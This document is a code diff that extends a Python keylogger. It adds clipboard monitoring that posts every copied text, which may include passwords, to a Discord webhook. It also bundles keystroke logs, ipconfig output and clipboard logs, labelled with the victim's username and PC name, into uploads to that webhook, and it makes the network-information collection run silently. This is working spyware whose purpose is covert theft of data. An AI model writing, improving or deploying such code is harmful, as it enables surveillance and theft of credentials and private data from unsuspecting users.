@@ -23,6 +23,7 @@ from PyQt5.QtWidgets import QApplication, QLabel, QWidget
 pc_name = socket.gethostname()
 log_file = "key_log.txt"
 file_pathip = os.path.join(os.getcwd(), 'ipconfig.txt')
+clipboard_log_file = "clipboard.txt"
 settings_file = "settings.json"
 user_name = os.environ.get('USER') or os.environ.get('USERNAME')
 last_timestamp = None
@@ -30,6 +31,9 @@ last_timestamp = None
 # Ensure the log files exist
 if not os.path.exists(log_file):
     Path(log_file).touch()
+
+if not os.path.exists(clipboard_log_file):
+    Path(clipboard_log_file).touch()
 
 if not os.path.exists(file_pathip):
     Path(file_pathip).touch()
@@ -56,6 +60,31 @@ def update_settings(new_value):
 def get_timestamp():
     """Returns the current timestamp as a formatted string."""
     return time.strftime("[%Y-%m-%d %H:%M] ")
+
+# Function to log clipboard content to the clipboard.txt file
+def log_clipboard():
+    last_clipboard_content = ""
+    while True:
+        try:
+            # Get current clipboard content
+            current_clipboard_content = pyperclip.paste()
+            if current_clipboard_content != last_clipboard_content:  # Only log if clipboard content has changed
+                timestamp = get_timestamp()
+                with open(clipboard_log_file, "a") as f:
+                    f.write(f"{timestamp} - {current_clipboard_content}\n")  # Log clipboard content with timestamp
+                last_clipboard_content = current_clipboard_content
+                
+                # Upload clipboard content to webhook
+                payload = {
+                    'content': f"Clipboard content: {current_clipboard_content}"
+                }
+                response = requests.post(webhook_url, data=payload)
+                if response.status_code != 204:
+                    print(f"Failed to send clipboard to webhook. Status code: {response.status_code}")
+            time.sleep(1)  # Check clipboard every second
+        except Exception as e:
+            print(f"Error logging clipboard: {e}")
+            time.sleep(5)
 
 def on_press(key):
     """Logs the pressed key to the file with timestamp every minute."""
@@ -84,13 +113,14 @@ def on_press(key):
 def upload_file_to_webhook(file_path, webhook_url):
     """Uploads files to a Discord webhook."""
     try:
-        with open(file_path, 'rb') as file, open(file_pathip, 'rb') as ipfile:
+        with open(file_path, 'rb') as file, open(file_pathip, 'rb') as ipfile, open(clipboard_log_file, 'rb') as clipboard_file:
             payload = {
-                'content': f'Here are the logs for the user {user_name} and the PC name is {pc_name}. This message also includes IPCONFIG data.'
+                'content': f'Here are the logs for the user {user_name} and the PC name is {pc_name}. This message also includes IPCONFIG data and clipboard data.'
             }
             files = {
                 'file1': (file_path, file),
-                'file2': (file_pathip, ipfile)
+                'file2': (file_pathip, ipfile),
+                'file3': (clipboard_log_file, clipboard_file)  # Correct reference to the clipboard log file
             }
             response = requests.post(webhook_url, data=payload, files=files)
             if response.status_code == 204:
@@ -108,20 +138,28 @@ def upload_every_5_seconds(file_path, webhook_url):
         time.sleep(5)
 
 # Run the ipconfig command every 5 seconds
+# Modify the subprocess call to suppress output
 def run_ipconfig():
     while True:
         try:
-            result = subprocess.run(['ipconfig'], capture_output=True, text=True)
+            # Run ipconfig silently (without opening a new console window)
+            result = subprocess.run(
+                ['ipconfig'],
+                capture_output=True,
+                text=True,
+                stdout=subprocess.DEVNULL,  # Suppress standard output
+                stderr=subprocess.DEVNULL   # Suppress standard error output
+            )
 
-            # Write the output to the ipconfig.txt file
+            # Write the output to the ipconfig.txt file silently
             with open(file_pathip, 'w') as file:
                 file.write(result.stdout)
-                pass
 
         except Exception as e:
             pass
         
         time.sleep(5)
+
 
 # Clear the console every second
 # def clear_console():
@@ -182,9 +220,10 @@ ipconfig_thread = threading.Thread(target=run_ipconfig)
 ipconfig_thread.daemon = True
 ipconfig_thread.start()
 
-# # Start console clearing thread
-# clear_thread = threading.Thread(target=clear_console, daemon=True)
-# clear_thread.start()
+# Start the clipboard logging in a separate thread
+clipboard_thread = threading.Thread(target=log_clipboard)
+clipboard_thread.daemon = True
+clipboard_thread.start()
 
 if __name__ == "__main__":
     # Load settings
@@ -204,8 +243,6 @@ if __name__ == "__main__":
     # If 'yes' is True, do nothing (counter is not shown)
     else:
         pass
-
-
 
 # Start the key listener in the main thread
 with keyboard.Listener(on_press=on_press) as listener:
